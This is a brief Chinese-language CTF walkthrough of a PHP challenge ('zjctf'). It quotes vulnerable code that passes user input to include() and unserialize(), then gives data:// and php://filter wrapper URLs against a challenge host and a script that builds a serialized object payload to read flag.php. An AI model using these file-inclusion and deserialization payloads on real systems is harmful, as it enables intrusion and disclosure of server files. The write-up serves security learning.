#PHP 伪协议 #PHP 序列化

```php
<?php
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if (isset($text) && (file_get_contents($text, 'r') === "welcome to the zjctf")) {
    echo "<br><h1>" . file_get_contents($text, 'r') . "</h1></br>";
    if (preg_match("/flag/", $file)) {
        echo "Not now!";
        exit();
    } else {
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
} else {
    highlight_file(__FILE__);
}

```

先

```url
http://1.14.71.254:28998/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/convert.base64-encode/resource=useless.php
```

得到一串 base64,解得

```php
<?php
class Flag{  //flag.php
    public $file;
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}
?>
```

构造 exp

```php
<?php
class Flag
{
    public $file;
}
$p = new Flag();
$p->file = 'flag.php';
echo urlencode(serialize($p));

```

得到

```url
O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D
```

之后

```url
?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
&file=useless.php
&password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D
```
